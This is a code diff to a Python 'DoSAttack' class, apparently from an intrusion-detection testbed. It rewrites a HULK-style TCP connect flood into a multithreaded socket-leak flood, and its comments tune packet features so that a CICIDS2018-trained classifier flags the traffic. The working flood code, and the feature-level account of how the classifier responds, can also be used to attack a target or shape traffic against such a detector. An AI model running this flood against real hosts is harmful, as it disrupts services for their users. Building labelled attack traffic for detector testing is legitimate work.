@@ -107,7 +107,7 @@ class DoSAttack:
                 self.last_error = err_msg
 
     # ──────────────────────────────────────────────────────
-    # HULK — TCP connect + hold ~13ms + send 1 byte + RST close
+    # HULK — Socket-leak TCP flood (connect + abandon)
     #
     # CICIDS2018 training data (n=461K, Fri-16-02-2018):
     #   Tot Fwd Pkts:       median=2, 81%=2, 16%=3
@@ -115,63 +115,83 @@ class DoSAttack:
     #   Tot Bwd Pkts:       94.5%=0, 5.5%=1-2
     #   Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
     #   Init Bwd Win Byts:  94.5%=-1 (no SYN-ACK), 4.4%=219
-    #   RST Flag Cnt:       100% = 0  ← critical!
+    #   RST Flag Cnt:       100% = 0  ← critical for RED!
     #   Flow Duration:      median=13085 µs (~13ms)
     #   Fwd Seg Size Min:   32  (TCP with timestamp options)
     #   Dst Port: 80
     #
-    # CRITICAL: Three features must match training for RED classification:
-    #   1. Init Bwd Win Byts = 219 (victim route window fix)
-    #   2. RST Flag Cnt = 0 (iptables DROP RST on attacker)
-    #   3. Flow Duration ≈ 13ms (hold + send 1 byte)
+    # APPROACH: Socket leak — connect then ABANDON the socket.
+    #   CICFlowMeter's idle timeout (15s) exports the flow with:
+    #     RST=0, FIN=0, Tot Fwd Pkts=2, Tot Bwd Pkts=1, dur≈1ms
+    #   Model prediction: DoS ≈ 50% → RED
+    #
+    # WHY NOT RST CLOSE:
+    #   RST close → RST Flag Cnt=1 → DoS=44% → YELLOW
+    #   iptables DROP RST → prevents flow termination → GREEN
+    #   Socket leak → RST=0 naturally → RED
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: TCP connect → hold ~13ms → send 1 byte → RST close.
+        """HULK DoS: Socket-leak TCP connect flood.
+
+        Opens TCP connections and ABANDONS them (no close, no data).
+        CICFlowMeter's idle timeout (15s) exports flows with RST=0.
 
         CICIDS2018 HULK training data (n=461K, Fri-16-02-2018):
-          Tot Fwd Pkts:       median=2, 81%=2, 16%=3
-          TotLen Fwd Pkts:    median=0 (94.5% no payload)
-          Tot Bwd Pkts:       94.5%=0 (server overwhelmed), 5.5%=1-2
-          Flow Duration:      median=13085 µs (~13ms)
-          Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
-          Init Bwd Win Byts:  94.5%=-1 (no SYN-ACK), 4.4%=219 (Ubuntu 16.04)
-          RST Flag Cnt:       100% = 0  (NO RSTs in training!)
-          Fwd Seg Size Min:   32 (TCP with timestamps)
-          Fwd Pkts/s:         median=229
-          Dst Port:           80
+          RST Flag Cnt:    100% = 0  (critical for RED classification)
+          Tot Fwd Pkts:    median=2 (SYN + ACK)
+          Tot Bwd Pkts:    median=0; our flows get 1 (SYN-ACK)
+          Init Fwd Win Byts: bimodal 75%=225, 25%=26883
+          Init Bwd Win Byts: 94.5%=-1, 4.4%=219 (Ubuntu 16.04)
+          TotLen Fwd Pkts: median=0 (no payload)
 
         HOW THIS ACHIEVES RED CLASSIFICATION:
-        The model requires three critical features to classify as DoS:
-        1. Init Bwd Win Byts = 219 (victim route window fix, matching Ubuntu 16.04)
-        2. RST Flag Cnt = 0 (iptables DROP outgoing RST on attacker)
-        3. Flow Duration ≈ 13ms (hold connection + send 1 byte for timestamp)
+        Socket leak avoids RST/FIN, matching training's RST=0.
+        CICFlowMeter exports after 15s idle timeout:
+          Fwd: SYN(t=0), ACK(t≈1ms) → 2 pkts, TotLen=0
+          Bwd: SYN-ACK(t≈0.5ms)     → 1 pkt
+          RST=0, FIN=0, Duration ≈ 1ms
+        Model prediction: DoS ≈ 50% → RED
 
-        Flow on the wire (as seen by CICFlowMeter):
-          Fwd: SYN(0ms), ACK(0.5ms), PSH+G(13ms)  → 3 pkts, TotLen=1
-          Bwd: SYN-ACK(0.3ms), ACK(13.3ms)         → 1-2 pkts
-          RST from SO_LINGER is DROPPED by iptables → CICFlowMeter sees RST=0
+        Sockets managed in a pool (max ~500/thread). Old sockets closed
+        after 30s (CICFlowMeter already exported). Late RST → tiny GREEN flow.
 
-        Model prediction: DoS ≈ 50% → RED (vs 29% YELLOW without these fixes)
+        REQUIRES: Victim ip route window 219 for Init Bwd Win Byts match.
         """
         end_time = time.time() + self.duration
 
+        # Socket pool: track (socket, open_time) for lifecycle management
+        leaked = []
+        # Max sockets per thread. With 10 threads: 500*10=5000 total FDs.
+        max_leaked = 500
+        # Hold sockets this long before closing. Must exceed:
+        #   CICFlowMeter idle_threshold (15s) + GC_interval (10s) = 25s
+        hold_time = 30.0
+
         while self.running and time.time() < end_time:
+            now = time.time()
+
+            # Cleanup: close sockets held for > hold_time.
+            # CICFlowMeter has already exported these flows (idle > 15s + GC).
+            # close() sends RST → separate tiny flow → classified GREEN.
+            while leaked and (now - leaked[0][1] >= hold_time
+                             or len(leaked) >= max_leaked):
+                old_sock, _ = leaked.pop(0)
+                try:
+                    old_sock.close()
+                except Exception:
+                    pass
+
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(3)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
-                # SO_LINGER(1,0): close() sends RST instead of FIN.
-                # The RST is dropped by iptables on the attacker, so
-                # CICFlowMeter never sees it → RST Flag Cnt = 0.
-                # Without iptables, RST Flag Cnt = 1 (still YELLOW, but
-                # improved from current 29% to 44% DoS probability).
+                # SO_LINGER(1,0) for eventual cleanup: close() sends RST
+                # instead of FIN exchange. Keeps cleanup fast.
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
 
                 # Bimodal SO_RCVBUF matching training distribution.
-                # On Linux with ip route window=225, the route overrides this
-                # but we still set it for Windows compatibility and correctness.
                 if random.random() < 0.75:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_LOW)
                 else:
@@ -180,28 +200,23 @@ class DoSAttack:
                 sock.connect((self.target_ip, self.target_port))
                 self._inc_count()
 
-                # Hold connection ~10-16ms to match training Flow Duration
-                # (median=13085µs). This creates the inter-packet gap that
-                # CICFlowMeter measures as flow duration.
-                time.sleep(random.uniform(0.010, 0.016))
+                # DON'T close, DON'T send data — leak the socket.
+                # CICFlowMeter sees: SYN+ACK (fwd) + SYN-ACK (bwd)
+                # After 15s idle → exported with RST=0, FIN=0 → RED
+                leaked.append((sock, time.time()))
 
-                # Send 1 byte to create a timestamped forward packet at
-                # t ≈ 13ms. Without this, the flow ends at the ACK (~0.5ms)
-                # and Flow Duration would be too short. The byte also
-                # triggers an ACK from the server (1-2 bwd pkts total).
-                # TotLen Fwd Pkts = 1 (minimal, close to training's 0).
-                try:
-                    sock.send(b'G')
-                except Exception:
-                    pass
-
-                # RST close — RST packet dropped by iptables OUTPUT rule.
-                sock.close()
             except Exception as e:
                 self._inc_error(str(e))
 
-            # Brief pause between connections (rate limiting)
-            time.sleep(random.uniform(0.001, 0.005))
+            # ~5-10ms between connections (100-200 conn/s per thread)
+            time.sleep(random.uniform(0.005, 0.010))
+
+        # Final cleanup: close all remaining leaked sockets
+        for sock, _ in leaked:
+            try:
+                sock.close()
+            except Exception:
+                pass
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
